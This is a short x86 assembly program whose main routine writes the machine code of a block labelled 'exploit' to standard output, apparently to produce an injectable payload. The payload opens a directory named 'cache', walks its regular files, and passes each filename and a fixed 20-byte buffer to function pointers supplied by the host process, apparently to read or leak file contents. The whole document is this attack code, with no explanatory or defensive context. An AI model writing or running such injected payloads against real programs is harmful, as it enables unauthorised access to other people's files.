.globl main
main:
	mov     $4, %eax
	xor     %ebx, %ebx
	inc     %ebx
	lea     exploit, %ecx
	mov     $(exploitend-exploit), %edx
	int     $0x80
	ret
exploit:
        pushl   %ebp
        movl    %esp, %ebp
        pushl   %edi
        pushl   %ebx
        subl    $160, %esp
        movl    $1751343459, -144(%ebp)
        movl    $101, -140(%ebp)
        leal    -136(%ebp), %ebx
        movl    $0, %eax
        movl    $30, %edx
        movl    %ebx, %edi
        movl    %edx, %ecx
        rep stosl
        movl    $.LC0, (%esp)
        call    opendir
        movl    %eax, -12(%ebp)
        jmp     .L2
.L3:
        movl    -16(%ebp), %eax
        movzbl  10(%eax), %eax
        cmpb    $8, %al
        jne     .L2
        movl    -16(%ebp), %eax
        leal    11(%eax), %edx
        leal    -144(%ebp), %eax
        movl    %eax, 4(%esp)
        movl    %edx, (%esp)
        movl    12(%ebp), %eax
        call    *%eax
        movl    $20, 4(%esp)
        leal    -144(%ebp), %eax
        addl    $12, %eax
        movl    %eax, (%esp)
        movl    16(%ebp), %eax
        call    *%eax
.L2:
        movl    -12(%ebp), %eax
        movl    %eax, (%esp)
        call    readdir
        movl    %eax, -16(%ebp)
        cmpl    $0, -16(%ebp)
        jne     .L3
        movl    -12(%ebp), %eax
        movl    %eax, (%esp)
        call    closedir
        addl    $160, %esp
        popl    %ebx
        popl    %edi
        popl    %ebp
        ret
.LC0:
        .string "cache"
exploitend:
